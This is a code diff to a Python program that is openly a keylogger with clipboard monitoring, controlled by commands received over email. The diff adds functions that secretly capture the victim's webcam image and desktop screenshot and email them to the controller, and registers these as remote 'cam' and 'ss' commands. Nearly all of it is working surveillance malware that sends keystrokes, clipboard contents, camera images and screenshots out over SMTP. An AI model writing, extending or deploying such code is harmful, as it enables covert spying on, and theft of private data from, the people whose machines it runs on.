@@ -14,6 +14,9 @@ import signal
 import sys
 import threading
 import time
+import cv2
+import pyautogui
+from PIL import Image
 from pathlib import Path
 import pyperclip
 from pynput import keyboard
@@ -44,6 +47,8 @@ IMAP_PORT     = 993
 EMAIL_ADDRESS = "you@gmail.com"
 EMAIL_PASS    = "<APP PASSWORD>"
 POLL_INTERVAL = 2
+CAM_OUTPUT_FILE = Path("webcam.jpg")
+SS_OUTPUT_FILE  = Path("screenshot.png")
 
 log_lock = threading.Lock()
 
@@ -205,6 +210,68 @@ def run_keylogger(stop_event: threading.Event) -> None:
         with log_lock:
             log_file.write(f"\n\n--- Recording interrupted at {ts} ---\n")
             log_file.close()
+# ── Webcam image and desktop screenshot ────────────────────────────────────────
+def capture_webcam(sender: str):
+    cam = cv2.VideoCapture(0)
+    if not cam.isOpened():
+        print("capture_webcam: could not open camera.")
+        return
+
+    ret, frame = cam.read()
+    cam.release()
+
+    if not ret:
+        print("capture_webcam: failed to capture frame.")
+        return
+
+    cv2.imwrite(str(CAM_OUTPUT_FILE), frame)
+    print(f"Webcam image saved to {CAM_OUTPUT_FILE}")
+
+    # Send it back via email
+    msg = MIMEMultipart()
+    msg["From"]    = EMAIL_ADDRESS
+    msg["To"]      = sender
+    msg["Subject"] = "Webcam capture"
+
+    with open(CAM_OUTPUT_FILE, "rb") as f:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(f.read())
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment; filename=webcam.jpg")
+    msg.attach(part)
+
+    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASS)
+        server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+
+    print(f"Webcam image sent to {sender}")
+
+
+def capture_screenshot(sender: str):
+    screenshot = pyautogui.screenshot()
+    screenshot.save(str(SS_OUTPUT_FILE))
+    print(f"Screenshot saved to {SS_OUTPUT_FILE}")
+
+    # Send it back via email
+    msg = MIMEMultipart()
+    msg["From"]    = EMAIL_ADDRESS
+    msg["To"]      = sender
+    msg["Subject"] = "Desktop screenshot"
+
+    with open(SS_OUTPUT_FILE, "rb") as f:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(f.read())
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment; filename=screenshot.png")
+    msg.attach(part)
+
+    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASS)
+        server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
+
+    print(f"Screenshot sent to {sender}")        
 # ── Clipboard monitor thread ───────────────────────────────────────────────────
 
 def run_clipboard_monitor(stop_event: threading.Event)->None:
@@ -280,6 +347,8 @@ def send_log(sender: str):
 
 COMMAND_MAP = {
     "log": send_log,
+    "cam": capture_webcam,
+    "ss":  capture_screenshot,
 }
 
 # ── Entry point ────────────────────────────────────────────────────────────────
@@ -315,11 +384,7 @@ def main():
             poller.start()
             run_keylogger(stop_event)
     except KeyboardInterrupt:
-        stop_event.set()
-        if poller:
-            poller.join()
-        if clip_thread:
-            clip_thread.join(timeout=CLIP_INTERVAL + 1)
+        print("Interrupted.")
     finally:
         stop_event.set()
         if poller:
